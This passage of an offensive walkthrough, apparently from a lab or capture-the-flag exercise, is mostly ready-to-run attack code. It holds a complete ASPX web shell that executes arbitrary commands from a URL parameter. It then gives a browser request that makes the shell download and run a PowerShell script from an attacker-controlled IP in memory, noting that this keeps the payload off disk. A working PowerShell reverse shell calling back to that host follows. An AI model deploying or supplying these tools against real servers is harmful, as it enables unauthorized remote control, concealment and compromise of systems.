## 2. ASPX Web Shell (Command Execution + Debugging)

### Create Web Shell

    vim shell.aspx

### Code

```csharp
<%@ Page Language="C#" Debug="true" %>

<%
Response.Write("<h3>ASPX Execution: OK</h3>");

// Command Execution
string cmd = Request.QueryString["cmd"];

if (!string.IsNullOrEmpty(cmd))
{
    try
    {
        var p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.StartInfo.CreateNoWindow = true;

        p.Start();

        string output = p.StandardOutput.ReadToEnd();
        string error = p.StandardError.ReadToEnd();

        p.WaitForExit();

        Response.Write("<pre>" + output + error + "</pre>");
    }
    catch (Exception ex)
    {
        Response.Write("Command execution failed: " + ex.Message);
    }
}

// Outbound Connection Test
string ip = Request.QueryString["ip"];
string portStr = Request.QueryString["port"];

if (!string.IsNullOrEmpty(ip) && !string.IsNullOrEmpty(portStr))
{
    int port;
    if (int.TryParse(portStr, out port))
    {
        try
        {
            var client = new System.Net.Sockets.TcpClient(ip, port);
            Response.Write("<br/><b>Connection Test:</b> Connected");
            client.Close();
        }
        catch (Exception ex)
        {
            Response.Write("<br/><b>Connection Test:</b> Failed (" + ex.Message + ")");
        }
    }
}

// Environment Info
Response.Write("<hr/>");
Response.Write("<b>User:</b> " + Environment.UserName + "<br/>");
Response.Write("<b>Machine:</b> " + Environment.MachineName + "<br/>");
Response.Write("<b>OS:</b> " + Environment.OSVersion + "<br/>");
%>
```

## 3. Trigger PowerShell Payload via Web Shell

### Execute from Browser

    http://192.168.10.52/data/shell.aspx?cmd=powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.10.7/rshell.ps1')"

### What Happens

- Downloads remote PowerShell script
- Executes in memory using `IEX`
- Avoids writing payload to disk

---

## 4. PowerShell Reverse Shell Script

### Create Script

    vim rshell.ps1

### Code

```powershell
$LHOST = "192.168.10.7"
$LPORT = 443

$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
$NetworkStream = $TCPClient.GetStream()

$StreamReader = New-Object IO.StreamReader($NetworkStream)
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
$StreamWriter.AutoFlush = $true

$Buffer = New-Object System.Byte[] 1024

while ($TCPClient.Connected) {
    while ($NetworkStream.DataAvailable) {
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData - 1)
    }

    if ($TCPClient.Connected -and $Code.Length -gt 1) {
        $Output = try {
            Invoke-Expression ($Code) 2>&1
        } catch {
            $_
        }

        $StreamWriter.Write("$Output`n")
        $Code = $null
    }
}

$TCPClient.Close()
$NetworkStream.Close()
$StreamReader.Close()
$StreamWriter.Close()
```
